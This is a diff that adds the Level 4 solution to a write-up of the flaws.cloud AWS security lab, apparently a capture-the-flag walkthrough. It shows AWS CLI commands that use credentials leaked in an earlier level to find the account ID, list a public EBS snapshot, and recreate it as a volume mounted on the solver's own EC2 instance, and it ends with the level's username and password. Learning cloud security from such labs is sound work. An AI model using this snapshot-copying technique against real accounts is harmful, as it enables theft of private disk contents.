@@ -161,6 +161,76 @@ Link for level 4: https://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
 
 ## Level 4
 
+For this level, we need to get access to the web page running on an EC2 at:http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+We are going to collect the snapshot running on the ec2 instance and clone it into our new EC2 instance.
+
+### Getting the snapshot in the flaws instance.
+
+we need the account ID, which we can get using the AWS key from the previous level:
+
+    $aws --profile flaws sts get-caller-identity
+
+Output:
+
+    {
+        "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
+        "Account": "975426262029",
+        "Arn": "arn:aws:iam::975426262029:user/backup"
+    }
+    
+Using the command also tells you the name of the account, which in this case is named "backup". The backups this account makes are snapshots of EC2s.
+
+Next, discover the snapshot:
+
+    $aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029
+
+Output:
+
+     {
+         "Snapshots": [
+             {
+                 "Description": "",
+                 "Encrypted": false,
+                 "OwnerId": "975426262029",
+                 "Progress": "100%",
+                 "SnapshotId": "snap-0b49342abd1bdcb89",
+                 "StartTime": "2017-02-28T01:35:12.000Z",
+                 "State": "completed",
+                 "VolumeId": "vol-04f1c039bc13ea950",
+                 "VolumeSize": 8,
+                 "Tags": [
+                     {
+                         "Key": "Name",
+                         "Value": "flaws backup 2017.02.27"
+                     }
+                 ],
+                 "StorageTier": "standard"
+             }
+         ]
+     }
+
+Now that you know the snapshot ID, you're going to want to mount it. You'll need to do this in your own AWS account.
+
+First, create a volume using the snapshot:
+
+     $aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
+
+Create an EC2 instance in your aws account in the us-west-2 region and in the storage options, choose the volume you just created.
+
+The ssh private keys you have generated while hosting the instance is the way of login towards the ssh server.
+
+After getting the ssh keys change the file permissions using:
+   
+    $chmod 400 YOUR_KEY.pem
+
+Use the command to login:
+ 
+     $ssh -i YOUR_KEY.pem  username@host
+
+
+
+
 uname: flaws
 pass: nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
 
